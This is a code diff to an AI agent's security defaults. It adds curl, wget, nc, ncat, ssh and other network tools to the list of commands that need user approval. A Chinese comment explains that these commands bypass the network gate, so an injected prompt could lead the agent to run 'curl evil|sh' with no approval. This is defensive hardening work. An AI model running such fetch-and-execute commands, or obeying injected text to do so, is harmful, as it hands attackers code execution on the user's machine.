@@ -13,9 +13,27 @@ export const SECURITY_DEFAULTS: SecurityConfig = {
   fileBlocklist: [],
   cmdAllow: [{ prefix: ["git", "push"] }, { prefix: ["npm", "install"] }],
   // rm 移出黑名单入危险分级表（command-risk.ts：rm -rf 根/系统目录 CRITICAL
-  // 先判，其余 rm -r/-rf/通配符 HIGH；单文件 rm 放行）、curl/wget 移出
-  // cmdAsk（网络域免审顺延，spec §4.3）
-  cmdAsk: [],
+  // 先判，其余 rm -r/-rf/通配符 HIGH；单文件 rm 放行）
+  // 安全批 S4（2026-11-02 审查）：网络外发类命令纳入默认 cmdAsk——曾按
+  // 「网络域免审顺延」移出，但该裁定的前提（网络域门管控）对 bash 子进程
+  // 网络不成立：NetworkGate 拦 undici/fetch，curl/wget 是独立进程直连，
+  // 域白名单对它无效。default 档免审 bash + 注入 = curl evil|sh 零审批执行。
+  // 交互档升为「询问」而非禁止（用户批准即执行）。
+  cmdAsk: [
+    { prefix: ["curl"] },
+    { prefix: ["wget"] },
+    { prefix: ["nc"] },
+    { prefix: ["ncat"] },
+    { prefix: ["ssh"] },
+    { prefix: ["scp"] },
+    { prefix: ["sftp"] },
+    { prefix: ["rsync"] },
+    { prefix: ["telnet"] },
+    { prefix: ["ftp"] },
+    { prefix: ["ping"] },
+    { prefix: ["dig"] },
+    { prefix: ["nslookup"] },
+  ],
   programBlacklist: [],
   domainAllow: [],
   domainDeny: [],
